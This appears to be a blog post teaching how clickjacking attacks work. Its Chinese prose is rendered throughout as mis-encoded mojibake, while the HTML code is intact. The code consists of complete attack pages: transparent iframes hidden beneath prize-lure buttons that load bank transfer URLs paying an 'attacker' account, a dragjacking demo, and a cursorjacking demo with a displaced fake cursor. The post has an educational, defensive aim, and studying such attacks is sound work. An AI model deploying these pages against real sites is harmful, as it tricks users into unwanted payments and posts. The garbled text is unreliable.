---
title: "ç‚¹å‡»åŠ«æŒæ”»å‡»ä¸é˜²æŠ¤ï¼ˆä¸€ï¼‰- æ”»å‡»åŸç†ä¸ç±»å‹"
excerpt: "æ·±å…¥æ¢è®¨ç‚¹å‡»åŠ«æŒæ”»å‡»çš„åŸºæœ¬åŸç†ã€æ”»å‡»æµç¨‹ã€é«˜çº§æŠ€æœ¯ä»¥åŠä¸åŒç±»å‹çš„ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œå¸®åŠ©å¼€å‘è€…ç†è§£è¿™ç§è§†è§‰æ¬ºéª—æ”»å‡»çš„æœºåˆ¶"
coverImage: "/assets/blog/preview/cover.jpg"
date: "2025-11-08"
author:
  name: å°ç¾½
  picture: "/assets/blog/authors/jj.jpeg"
ogImage:
  url: "/assets/blog/dynamic-routing/cover.jpg"
---

# ç‚¹å‡»åŠ«æŒæ”»å‡»ä¸é˜²æŠ¤ï¼ˆä¸€ï¼‰ï¼šæ”»å‡»åŸç†ä¸ç±»å‹

## å‰è¨€

ç‚¹å‡»åŠ«æŒ(Clickjacking)æ˜¯ä¸€ç§è§†è§‰æ¬ºéª—æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡å°†ç›®æ ‡ç½‘ç«™åµŒå…¥é€æ˜iframeï¼Œå¹¶è¦†ç›–å…¶ä»–å†…å®¹ï¼Œè¯±éª—ç”¨æˆ·ç‚¹å‡»éé¢„æœŸçš„ä½ç½®ã€‚è¿™ç§æ”»å‡»å¯ä»¥å¯¼è‡´ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼Œå¦‚è½¬è´¦ã€ä¿®æ”¹å¯†ç ã€ä¸‹è½½æ¶æ„è½¯ä»¶ç­‰ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ç‚¹å‡»åŠ«æŒæ”»å‡»çš„åŸç†ã€ç±»å‹ä»¥åŠæ”»å‡»æŠ€æœ¯ï¼Œå¸®åŠ©ä½ ç†è§£è¿™ç§éšè”½ä½†å±å®³æ€§æå¤§çš„Webå®‰å…¨å¨èƒã€‚

## ç‚¹å‡»åŠ«æŒæ”»å‡»åŸç†

### åŸºæœ¬æ”»å‡»æµç¨‹

ç‚¹å‡»åŠ«æŒæ”»å‡»çš„æ ¸å¿ƒæ€æƒ³æ˜¯åˆ©ç”¨é€æ˜iframeå’Œè§†è§‰æ¬ºéª—ï¼Œè®©ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ç‚¹å‡»éšè—çš„å…ƒç´ ã€‚ä»¥ä¸‹æ˜¯åŸºæœ¬çš„æ”»å‡»æµç¨‹ï¼š

```html
<!-- 1. æ”»å‡»è€…åˆ›å»ºæ¶æ„é¡µé¢ -->
<!DOCTYPE html>
<html>
<head>
  <title>æœ‰è¶£çš„å°æ¸¸æˆ</title>
  <style>
    /* éšè—ç›®æ ‡ç½‘ç«™ */
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0; /* å®Œå…¨é€æ˜ */
      z-index: 2;
      border: none;
    }
    
    /* è¯±é¥µå†…å®¹ */
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
    
    /* è¯±é¥µæŒ‰é’® */
    .decoy-button {
      position: absolute;
      top: 200px;
      left: 300px;
      width: 120px;
      height: 40px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- è¯±é¥µå†…å®¹ -->
  <div class="decoy-content">
    <h1>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®èµ¢å–å¤§å¥–ï¼</h1>
    <button class="decoy-button">ç‚¹å‡»èµ¢å¥–</button>
  </div>
  
  <!-- éšè—çš„ç›®æ ‡ç½‘ç«™ -->
  <iframe 
    class="hidden-iframe"
    src="https://bank.example.com/transfer?to=attacker&amount=1000">
  </iframe>
</body>
</html>

<!-- 2. ç”¨æˆ·çœ‹åˆ°çš„æ˜¯è¯±é¥µå†…å®¹ -->
<!-- ä½†å®é™…ç‚¹å‡»çš„æ˜¯é€æ˜iframeä¸­çš„è½¬è´¦æŒ‰é’® -->
```

æ”»å‡»æµç¨‹çš„å…³é”®æ­¥éª¤ï¼š
1. æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«é€æ˜iframeçš„æ¶æ„é¡µé¢
2. iframeåŠ è½½ç›®æ ‡ç½‘ç«™ï¼ˆå¦‚é“¶è¡Œç½‘ç«™ï¼‰
3. æ”»å‡»è€…åœ¨iframeä¸Šæ–¹æ”¾ç½®è¯±é¥µå†…å®¹ï¼ˆå¦‚æŠ½å¥–æŒ‰é’®ï¼‰
4. ç”¨æˆ·ç‚¹å‡»è¯±é¥µæŒ‰é’®æ—¶ï¼Œå®é™…ä¸Šç‚¹å‡»äº†iframeä¸­çš„æ•æ„Ÿæ“ä½œæŒ‰é’®
5. æ•æ„Ÿæ“ä½œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œ

### é«˜çº§ç‚¹å‡»åŠ«æŒæŠ€æœ¯

é™¤äº†åŸºæœ¬çš„é€æ˜iframeæŠ€æœ¯ï¼Œæ”»å‡»è€…è¿˜å¼€å‘äº†å¤šç§é«˜çº§ç‚¹å‡»åŠ«æŒæŠ€æœ¯ï¼š

#### 1. æ‹–æ‹½åŠ«æŒ(Dragjacking)

æ‹–æ‹½åŠ«æŒåˆ©ç”¨ç”¨æˆ·çš„æ‹–æ‹½æ“ä½œï¼Œåœ¨ç”¨æˆ·æ‹–æ‹½å…ƒç´ æ—¶è§¦å‘éšè—iframeä¸­çš„æ“ä½œï¼š

```html
<!-- æ‹–æ‹½åŠ«æŒç¤ºä¾‹ -->
<!DOCTYPE html>
<html>
<head>
  <title>æ‹–æ‹½æ¸¸æˆ</title>
  <style>
    .game-area {
      width: 500px;
      height: 500px;
      border: 2px solid #333;
      position: relative;
      overflow: hidden;
    }
    
    .draggable {
      width: 100px;
      height: 100px;
      background-color: #3498db;
      position: absolute;
      cursor: move;
      z-index: 2;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 1;
      border: none;
      pointer-events: none; /* ç¦ç”¨iframeäº¤äº’ */
    }
    
    .drop-zone {
      width: 150px;
      height: 150px;
      background-color: #2ecc71;
      position: absolute;
      bottom: 20px;
      right: 20px;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>å°†è“è‰²æ–¹å—æ‹–åˆ°ç»¿è‰²åŒºåŸŸ</h1>
  
  <div class="game-area">
    <div class="draggable" id="draggable"></div>
    <div class="drop-zone"></div>
    
    <!-- éšè—çš„ç›®æ ‡ç½‘ç«™ -->
    <iframe 
      class="hidden-iframe"
      id="target-iframe"
      src="https://social-media.example.com/share?message=I+love+this+product!">
    </iframe>
  </div>
  
  <script>
    const draggable = document.getElementById('draggable');
    const targetIframe = document.getElementById('target-iframe');
    let isDragging = false;
    let startX, startY;
    
    draggable.addEventListener('mousedown', (e) => {
      isDragging = true;
      startX = e.clientX;
      startY = e.clientY;
      
      // å¼€å§‹æ‹–æ‹½æ—¶å¯ç”¨iframeäº¤äº’
      targetIframe.style.pointerEvents = 'auto';
    });
    
    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      
      const deltaX = e.clientX - startX;
      const deltaY = e.clientY - startY;
      
      draggable.style.transform = `translate(${deltaX}px, ${deltaY}px)`;
    });
    
    document.addEventListener('mouseup', () => {
      isDragging = false;
      
      // åœæ­¢æ‹–æ‹½æ—¶ç¦ç”¨iframeäº¤äº’
      targetIframe.style.pointerEvents = 'none';
    });
  </script>
</body>
</html>
```

#### 2. å…‰æ ‡åŠ«æŒ(Cursorjacking)

å…‰æ ‡åŠ«æŒé€šè¿‡ä¼ªé€ å…‰æ ‡ä½ç½®ï¼Œè¯¯å¯¼ç”¨æˆ·ç‚¹å‡»éé¢„æœŸä½ç½®ï¼š

```html
<!-- å…‰æ ‡åŠ«æŒç¤ºä¾‹ -->
<!DOCTYPE html>
<html>
<head>
  <title>å…‰æ ‡åŠ«æŒç¤ºä¾‹</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      cursor: none; /* éšè—çœŸå®å…‰æ ‡ */
    }
    
    .fake-cursor {
      position: absolute;
      width: 20px;
      height: 20px;
      background-image: url('cursor.png');
      pointer-events: none; /* ä¸å½±å“é¼ æ ‡äº‹ä»¶ */
      z-index: 1000;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
    
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
  </style>
</head>
<body>
  <!-- è¯±é¥µå†…å®¹ -->
  <div class="decoy-content">
    <h1>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®è·å–å¥–åŠ±</h1>
    <button style="position: absolute; top: 200px; left: 300px;">è·å–å¥–åŠ±</button>
  </div>
  
  <!-- éšè—çš„ç›®æ ‡ç½‘ç«™ -->
  <iframe 
    class="hidden-iframe"
    src="https://example.com/subscribe">
  </iframe>
  
  <!-- å‡å…‰æ ‡ -->
  <div class="fake-cursor" id="fake-cursor"></div>
  
  <script>
    const fakeCursor = document.getElementById('fake-cursor');
    
    // è·Ÿè¸ªçœŸå®é¼ æ ‡ä½ç½®
    document.addEventListener('mousemove', (e) => {
      // åç§»å‡å…‰æ ‡ä½ç½®
      const offsetX = 100; // æ°´å¹³åç§»
      const offsetY = 50;  // å‚ç›´åç§»
      
      fakeCursor.style.left = (e.clientX + offsetX) + 'px';
      fakeCursor.style.top = (e.clientY + offsetY) + 'px';
    });
  </script>
</body>
</html>
```

## ç‚¹å‡»åŠ«æŒæ”»å‡»ç±»å‹

### ç»å…¸ç‚¹å‡»åŠ«æŒ

ç»å…¸ç‚¹å‡»åŠ«æŒæ˜¯æœ€å¸¸è§çš„ç±»å‹ï¼Œé€šå¸¸é’ˆå¯¹é‡‘èäº¤æ˜“ã€ç¤¾äº¤åª’ä½“åˆ†äº«ç­‰æ•æ„Ÿæ“ä½œï¼š

```html
<!-- é“¶è¡Œè½¬è´¦ç‚¹å‡»åŠ«æŒ -->
<!DOCTYPE html>
<html>
<head>
  <title>å…è´¹æŠ½å¥–æ´»åŠ¨</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    
    .container {
      width: 100%;
      height: 100vh;
      position: relative;
      overflow: hidden;
    }
    
    .lottery-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      padding-top: 50px;
    }
    
    .lottery-title {
      font-size: 2.5em;
      margin-bottom: 20px;
    }
    
    .lottery-description {
      font-size: 1.2em;
      margin-bottom: 30px;
    }
    
    .lottery-button {
      position: absolute;
      top: 300px;
      left: 50%;
      transform: translateX(-50%);
      width: 200px;
      height: 60px;
      background-color: #ff6b6b;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 1.5em;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- è¯±é¥µå†…å®¹ -->
    <div class="lottery-content">
      <h1 class="lottery-title">ğŸ‰ å¹¸è¿å¤§æŠ½å¥– ğŸ‰</h1>
      <p class="lottery-description">
        ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®ï¼Œæœ‰æœºä¼šèµ¢å–iPhone 14 Proï¼<br>
        100%ä¸­å¥–ï¼Œç»ä¸è½ç©ºï¼
      </p>
      
      <button class="lottery-button">ç«‹å³æŠ½å¥–</button>
    </div>
    
    <!-- éšè—çš„é“¶è¡Œè½¬è´¦é¡µé¢ -->
    <iframe 
      class="hidden-iframe"
      src="https://bank.example.com/transfer?to=attacker-account&amount=5000">
    </iframe>
  </div>
</body>
</html>
```

### ç‚¹å‡»åŠ«æŒæ”»å‡»çš„å±å®³

ç‚¹å‡»åŠ«æŒæ”»å‡»å¯èƒ½å¯¼è‡´ä»¥ä¸‹ä¸¥é‡åæœï¼š

1. **é‡‘èæŸå¤±**ï¼šç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¿›è¡Œè½¬è´¦æˆ–æ”¯ä»˜
2. **éšç§æ³„éœ²**ï¼šç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹åˆ†äº«ä¸ªäººä¿¡æ¯
3. **è´¦æˆ·åŠ«æŒ**ï¼šæ”»å‡»è€…é€šè¿‡ç‚¹å‡»åŠ«æŒè·å–ç”¨æˆ·è´¦æˆ·æ§åˆ¶æƒ
4. **æ¶æ„è½¯ä»¶ä¸‹è½½**ï¼šè¯±éª—ç”¨æˆ·ä¸‹è½½å¹¶å®‰è£…æ¶æ„è½¯ä»¶
5. **ç¤¾äº¤åª’ä½“æ»¥ç”¨**ï¼šåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å‘å¸ƒå†…å®¹æˆ–å‘é€æ¶ˆæ¯

## æ€»ç»“

ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§éšè”½ä½†å±å®³æ€§æå¤§çš„Webå®‰å…¨å¨èƒï¼Œé€šè¿‡è§†è§‰æ¬ºéª—è¯±éª—ç”¨æˆ·æ‰§è¡Œéé¢„æœŸæ“ä½œã€‚äº†è§£ç‚¹å‡»åŠ«æŒçš„æ”»å‡»åŸç†å’Œç±»å‹æ˜¯æ„å»ºæœ‰æ•ˆé˜²æŠ¤ç­–ç•¥çš„ç¬¬ä¸€æ­¥ã€‚

åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨ç‚¹å‡»åŠ«æŒçš„é˜²æŠ¤ç­–ç•¥ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„é˜²æŠ¤æŠ€æœ¯ï¼Œä»¥åŠå¦‚ä½•æ£€æµ‹å’Œç›‘æ§ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œå¸®åŠ©ä½ æ„å»ºæ›´åŠ å®‰å…¨çš„Webåº”ç”¨ã€‚